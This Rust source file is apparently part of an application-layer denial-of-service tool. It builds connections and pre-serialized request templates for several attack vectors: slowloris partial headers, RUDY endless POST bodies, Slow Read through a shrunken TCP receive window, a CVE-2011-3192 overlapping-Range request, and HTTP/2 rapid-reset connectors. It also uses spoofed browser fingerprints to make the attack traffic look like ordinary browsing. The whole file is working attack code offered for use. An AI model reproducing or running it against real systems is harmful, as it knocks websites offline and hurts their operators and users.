//! Connection primitives shared by the L7 vectors.
//!
//! A `Conn` is a plain or TLS-wrapped TCP stream behind a single enum — no heap
//! box, no vtable in the I/O path. Both variants are `Unpin`, so the
//! `AsyncRead`/`AsyncWrite` delegation needs no pin projection.

use anyhow::{anyhow, Context, Result};
use std::net::SocketAddr;
use std::pin::Pin;
use std::sync::Arc;
use std::task::{Context as TaskContext, Poll};
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};
use tokio::net::{TcpSocket, TcpStream};
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;

const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);

/// Fully-resolved target. DNS is done once, up front, and the `SocketAddr` is
/// shared by every worker so the hot path never resolves.
pub struct Target {
    pub tls: bool,
    pub host: String,
    pub addr: SocketAddr,
    /// Path + query, ready to drop into the request line.
    pub path: String,
    pub server_name: ServerName<'static>,
    pub connector: TlsConnector,
    /// TLS connector advertising ALPN `h2`, for the HTTP/2 rapid-reset vector.
    pub h2_connector: TlsConnector,
}

impl Target {
    /// Resolve a target URL into a reusable `Target` (DNS once).
    pub async fn resolve(url_str: &str) -> Result<Self> {
        let url = url::Url::parse(url_str).context("parsing target URL")?;
        let tls = matches!(url.scheme(), "https");
        let host = url
            .host_str()
            .ok_or_else(|| anyhow!("target URL has no host"))?
            .to_string();
        let port = url.port_or_known_default().unwrap_or(if tls { 443 } else { 80 });
        let addr = tokio::net::lookup_host((host.as_str(), port))
            .await
            .with_context(|| format!("resolving {host}:{port}"))?
            .next()
            .ok_or_else(|| anyhow!("no address for {host}"))?;

        let path = {
            let p = url.path();
            match url.query() {
                Some(q) => format!("{p}?{q}"),
                None => p.to_string(),
            }
        };

        let server_name = ServerName::try_from(host.clone())
            .context("target host is not a valid TLS server name")?;

        Ok(Target {
            tls,
            host,
            addr,
            path,
            server_name,
            connector: build_connector(&[]),
            h2_connector: build_connector(&[b"h2".to_vec()]),
        })
    }

    /// Open a connection with a deliberately small OS receive buffer, so our
    /// advertised TCP window is tiny — the mechanism behind the Slow Read
    /// vector (server can't flush its response, holds the connection open).
    pub async fn connect_small_window(&self, rcvbuf: u32) -> Result<Conn> {
        let socket = if self.addr.is_ipv4() {
            TcpSocket::new_v4()?
        } else {
            TcpSocket::new_v6()?
        };
        socket.set_recv_buffer_size(rcvbuf).ok();
        let tcp = tokio::time::timeout(CONNECT_TIMEOUT, socket.connect(self.addr))
            .await
            .context("connect timed out")??;
        tcp.set_nodelay(true).ok();
        if self.tls {
            let stream = tokio::time::timeout(
                CONNECT_TIMEOUT,
                self.connector.connect(self.server_name.clone(), tcp),
            )
            .await
            .context("TLS handshake timed out")??;
            Ok(Conn::Tls(Box::new(stream)))
        } else {
            Ok(Conn::Plain(tcp))
        }
    }

    /// Open one TLS connection with ALPN `h2` negotiated, returning the raw
    /// stream for the h2 client handshake. Used by the rapid-reset vector.
    pub async fn connect_h2(&self) -> Result<TlsStream<TcpStream>> {
        let tcp = tokio::time::timeout(CONNECT_TIMEOUT, TcpStream::connect(self.addr))
            .await
            .context("connect timed out")??;
        tcp.set_nodelay(true).ok();
        let stream = tokio::time::timeout(
            CONNECT_TIMEOUT,
            self.h2_connector.connect(self.server_name.clone(), tcp),
        )
        .await
        .context("TLS(h2) handshake timed out")??;
        Ok(stream)
    }

    /// Open one connection (TCP, plus TLS handshake when applicable).
    pub async fn connect(&self) -> Result<Conn> {
        let tcp = tokio::time::timeout(CONNECT_TIMEOUT, TcpStream::connect(self.addr))
            .await
            .context("connect timed out")??;
        tcp.set_nodelay(true).ok();
        if self.tls {
            let stream = tokio::time::timeout(
                CONNECT_TIMEOUT,
                self.connector.connect(self.server_name.clone(), tcp),
            )
            .await
            .context("TLS handshake timed out")??;
            Ok(Conn::Tls(Box::new(stream)))
        } else {
            Ok(Conn::Plain(tcp))
        }
    }
}

/// One shared rustls config for the whole run — Mozilla roots, ring provider.
/// `alpn` sets advertised ALPN protocols (empty = none).
fn build_connector(alpn: &[Vec<u8>]) -> TlsConnector {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder()
        .with_root_certificates(roots)
        .with_no_client_auth();
    config.alpn_protocols = alpn.to_vec();
    TlsConnector::from(Arc::new(config))
}

/// Plain or TLS stream. `Tls` is boxed only because a `TlsStream` is large;
/// the box is allocated once per connection, never per request.
pub enum Conn {
    Plain(TcpStream),
    Tls(Box<TlsStream<TcpStream>>),
}

impl AsyncRead for Conn {
    #[inline]
    fn poll_read(
        self: Pin<&mut Self>,
        cx: &mut TaskContext<'_>,
        buf: &mut ReadBuf<'_>,
    ) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            Conn::Plain(s) => Pin::new(s).poll_read(cx, buf),
            Conn::Tls(s) => Pin::new(s.as_mut()).poll_read(cx, buf),
        }
    }
}

impl AsyncWrite for Conn {
    #[inline]
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut TaskContext<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        match self.get_mut() {
            Conn::Plain(s) => Pin::new(s).poll_write(cx, buf),
            Conn::Tls(s) => Pin::new(s.as_mut()).poll_write(cx, buf),
        }
    }

    #[inline]
    fn poll_flush(
        self: Pin<&mut Self>,
        cx: &mut TaskContext<'_>,
    ) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            Conn::Plain(s) => Pin::new(s).poll_flush(cx),
            Conn::Tls(s) => Pin::new(s.as_mut()).poll_flush(cx),
        }
    }

    #[inline]
    fn poll_shutdown(
        self: Pin<&mut Self>,
        cx: &mut TaskContext<'_>,
    ) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            Conn::Plain(s) => Pin::new(s).poll_shutdown(cx),
            Conn::Tls(s) => Pin::new(s.as_mut()).poll_shutdown(cx),
        }
    }
}

/// A small set of realistic browser fingerprints. Requests are fully
/// pre-serialized once so workers never format strings in the hot loop.
const FINGERPRINTS: &[(&str, &str)] = &[
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    ),
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ),
    (
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    ),
    (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ),
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36 Edg/124.0",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    ),
];

/// Pre-build one keep-alive GET per fingerprint. Called once at run start.
pub fn build_get_templates(host: &str, path: &str) -> Arc<[Box<[u8]>]> {
    let templates: Vec<Box<[u8]>> = FINGERPRINTS
        .iter()
        .map(|(ua, accept)| {
            let req = format!(
                "GET {path} HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 User-Agent: {ua}\r\n\
                 Accept: {accept}\r\n\
                 Accept-Language: en-US,en;q=0.9\r\n\
                 Connection: keep-alive\r\n\r\n"
            );
            req.into_bytes().into_boxed_slice()
        })
        .collect();
    templates.into()
}

/// Pre-build the partial (deliberately unterminated) request head slowloris
/// workers send once per connection. Note the absence of the final blank line.
pub fn build_slowloris_head(host: &str, path: &str) -> Arc<[u8]> {
    let head = format!(
        "GET {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36\r\n\
         Accept: text/html,*/*;q=0.8\r\n"
    );
    head.into_bytes().into()
}

/// Pre-build a single request carrying a CVE-2011-3192 style Range header with
/// ~1300 overlapping byte ranges, forcing the server into costly multipart
/// response assembly. Returned in the same template shape as the GET builder.
pub fn build_range_templates(host: &str, path: &str) -> Arc<[Box<[u8]>]> {
    let mut ranges = String::with_capacity(12 * 1024);
    ranges.push_str("bytes=0-");
    for i in 0..1300 {
        ranges.push_str(&format!(",{i}-{}", i + 1));
    }
    let req = format!(
        "GET {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36\r\n\
         Accept: */*\r\n\
         Range: {ranges}\r\n\
         Accept-Encoding: gzip\r\n\
         Connection: keep-alive\r\n\r\n"
    );
    let templates: Vec<Box<[u8]>> = vec![req.into_bytes().into_boxed_slice()];
    templates.into()
}

/// Pre-build the RUDY POST head: complete headers declaring a large body we
/// then trickle forever without ever finishing. Body bytes are sent separately.
pub fn build_rudy_head(host: &str, path: &str, content_length: usize) -> Arc<[u8]> {
    let head = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: {content_length}\r\n\
         Connection: keep-alive\r\n\r\n"
    );
    head.into_bytes().into()
}
